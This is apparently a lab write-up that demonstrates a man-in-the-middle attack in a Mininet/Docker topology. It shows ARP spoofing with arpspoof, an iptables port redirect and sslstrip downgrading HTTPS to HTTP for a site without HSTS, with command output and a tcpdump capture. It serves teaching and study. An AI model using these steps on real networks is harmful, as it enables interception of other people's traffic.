# MITM over TLS

**Man-in-the-middle (MITM)** refers to an attack where an actor stands between 2 entities communicating with eachother and intercepts or even changes the information sent from one to another. When the traffic is not encrypted this attack can be done by doing an ARP spoofing and capturing the incoming traffic on the attacker's device. In the case of encrypted communication there is more into making the MITM attack possible.

In the following sections I will explain how to capture readable data sent between the victim's device and a website running over HTTPS that should normally be encrypted.

## Topology

In order to recreate this attack the following components were used:
* a victim machine (Ubuntu 18.04 with `curl` installed)
* a website (www.digi24.ro) that is using **HTTPS**
* an attacker machine (Ubuntu 18.04 with `tcpdump`, `arpspoof`, `iptables` and `sslstrip` installed)

The topology I created has the following details. The attacker and the victim both have Internet connection and are in the same network `192.168.16.0/24`:
* default gateway `192.168.16.1/24`
* attacker `192.168.16.2/24`
* victim `192.168.16.3/24`

> The website should be running on HTTPS, but should not have [**HSTS**](https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security).

## How it's done

The end goal of this attack si to be able to intercept unencrypted data on the attacker's side. The data come from the communication between the victim and a vulnerable website using HTTP. It's vulnerability is that it is not using HSTS to prevent MITM attacks. The flow of the data will look as in the following image.

![enter image description here](https://scontent.fotp3-3.fna.fbcdn.net/v/t1.15752-9/56162869_565199757216898_7687985661634150400_n.png?_nc_cat=101&_nc_sid=b96e70&_nc_ohc=M1jRqWdq9xwAX_ZkELO&_nc_ht=scontent.fotp3-3.fna&oh=1049ba0ce6f2ac3a9d4a2643f58871e1&oe=5EE29D2E)

### Step 0

I start by capturing traffic on the attacker machine. I need the interface on the attacker's machine for this. This is `attacker-eth0` (known from when the topology was created). To check:
```bash
root@attacker:/# ifconfig
attacker-eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
inet 192.168.16.2  netmask 255.255.255.0  broadcast 0.0.0.0
ether 2e:a2:48:8e:ec:4b  txqueuelen 1000  (Ethernet)
RX packets 14  bytes 1096 (1.0 KB)
RX errors 0  dropped 0  overruns 0  frame 0
TX packets 0  bytes 0 (0.0 B)
TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
(..)
root@attacker:/# tcpdump -i attacker-eth0 -Z root -w capture.pcap &
[452]
```

The `capture.pcap` file will be analyzed at the end of the attack.

### Step 1

The next thing that needs to be done is to set the ip forwarding for the attacking machine so that when it receives packets from the victim packets will be forwarded to the destination IP address labeled on the network layer of the packet. For this I simply wrote value `1` in the following file:

```bash
root@attacker:/# echo 1 > /proc/sys/net/ipv4/ip_forward
root@attacker:/# cat /proc/sys/net/ipv4/ip_forward
1
```

### Step 2

The next step is to link the attacker’s MAC address with the IP address of the victim's computer. Once the attacker’s MAC address is connected to that IP address, the attacker will begin receiving any data that is intended for the victim. This is the step where the attacker places itself between the victim and the website.

To do this use I first need the IP addresses of the victim and the default gateway. These were specified when creating the topology, but in order to check I can use the following commands. 

```bash
root@victim:/# ifconfig
(..)
victim-eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
inet 192.168.16.3  netmask 255.255.255.0  broadcast 0.0.0.0
ether f6:b5:a9:73:f8:e1  txqueuelen 1000  (Ethernet)
RX packets 14  bytes 1096 (1.0 KB)
RX errors 0  dropped 0  overruns 0  frame 0
TX packets 0  bytes 0 (0.0 B)
TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
root@victim:/# ip r s
default via 192.168.16.1 dev victim-eth0
192.168.16.0/24 dev victim-eth0 proto kernel scope link src 192.168.16.3
```

The victim's IP address is `192.168.16.3`, while the default gateway is `192.168.16.1`.

Now the ARP spoofing can begin. I run `arpspoof` twice (so that I can capture both incoming and outgoing traffic). I do this on the attacker's machine.

```bash
root@attacker:/# arpspoof -i attacker-eth0 -t 192.168.16.3 192.168.16.1 > /dev/null 2> /dev/null &
[1] 59
root@attacker:/# arpspoof -i attacker-eth0 -t 192.168.16.1 192.168.16.3 > /dev/null 2> /dev/null &
[1] 60
```

Check on the victim's machine that the spoofing is taking place. The MAC addresses for both IPs should be the same. Since the attack takes place on layer 2 the interesting bits are the MAC addresses. 

```bash
root@victim:/# arp -a
? (192.168.16.1) at 2e:a2:48:8e:ec:4b [ether] on victim-eth0
? (192.168.16.2) at 2e:a2:48:8e:ec:4b [ether] on victim-eth0
```

Now the attacker sees all the communication between the victim and the Internet. Unfortunately, he still sees only encrypted traffic. I needed to do an HTTPS downgrade (or HTTPS stripping) so that on the attacker side I can see plain text traffic.


### Step 3

In order to intercept unencrypted traffic I needed to downgrade the victim's connection from HTTPS to HTTP. I did this using `sslstrip`. First I redirecting outgoing traffic on port 80 to 8080 and then I started `sslstrip` on port `8080`.


```bash
root@attacker:/# iptables -t nat -p tcp -A PREROUTING --destination-port 80 -j REDIRECT --to-port 8080
root@attacker:/# sslstrip -l 8080

sslstrip 0.9 by Moxie Marlinspike running...

``` 

On the victim machine I used `curl` to send a `GET` request to `http://digi24.ro`.

```bash
root@victim:/# curl -vvv http://digi24.ro
* Rebuilt URL to: http://digi24.ro/
* Trying 81.196.8.46...
* TCP_NODELAY set
* Connected to digi24.ro (81.196.8.46) port 80 (#0)
> GET / HTTP/1.1
> Host: digi24.ro
> User-Agent: curl/7.58.0
> Accept: */*
>
< HTTP/1.1 301 Moved Permanently
< Content-Length: 162
< Server: RDS-WebServer v2
< Connection: close
< Location: http://www.digi24.ro/ # The request was redirected to this.
< Date: Fri, 15 May 2020 13:08:07 GMT
< Content-Type: text/html
<
<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx</center>
</body>
</html>
* Closing connection 0
```

The request was redirected to `http://www.digi24.ro/`. Another `GET` on this URL returns the page content unencrypted. The attack is now complete: I can view unecrypted traffic going between the victim and the vulnerable website using HTTPS.

```bash
root@victim:/# curl -vvv http://www.digi24.ro/
(..)
<!-- END: "FrontendUiMain\View\Helper\WidgetLayoutLayoutBodyAssets" --></body></html>
```

###  Step 4

I stopped the tcpdump process on the attacker and I opened the capture using Wireshark. After filterin packets by protocol (only HTTP) I found the following:

![enter image description here](https://scontent.fotp3-2.fna.fbcdn.net/v/t1.15752-9/s2048x2048/98279780_257285382296503_6574269155376103424_n.png?_nc_cat=106&_nc_sid=b96e70&_nc_ohc=J441EsDrXKUAX8T6FYF&_nc_ht=scontent.fotp3-2.fna&oh=81452735d759a9c62dbd954ba2977a7a&oe=5EE27E26)

By following the HTTP stream here I was able to see the contents of the website the same way the victim does.

![enter image description here](https://scontent.fotp3-2.fna.fbcdn.net/v/t1.15752-9/s2048x2048/98367350_241217873641263_5746737680239034368_n.png?_nc_cat=105&_nc_sid=b96e70&_nc_ohc=5qwHL8uwFTIAX_Xz0IY&_nc_ht=scontent.fotp3-2.fna&oh=3e4e3d08207905910865171fb7db2ea6&oe=5EE5AAC5)

## Archive contents

The archive contains the following:
* ***MITM over TLS.pdf*** this file containing explanations on how the attack is done.
* ***Dockerfile*** used to build docker images for both the victim and attacker (both of the machines have the exact same configuration).
* ***Makefile*** that runs the `docker build` command.
* ***capture.pcap*** is the capture containing the traffic generated during this attack.
* ***topology.py*** script to start the Mininet topology used for this attack.
* ***start-attacker.sh*** script used to connect to the attacker machine.
* ***start-victim.sh*** script used to connect to the victim machine.
* ***install.sh*** used to install Mininet (taken from the CDCI labs topology).
* ***start-app.sh*** runs on docker to prevent the container from exiting (taken from the CDCI labs topology).
* ***run-on-attacker.sh*** to run on the attacker machine. Does the ARP spoofing and SSL stripping.
* ***run-on-victim.sh*** to run on the victim machine. Generates HTTPS traffic.



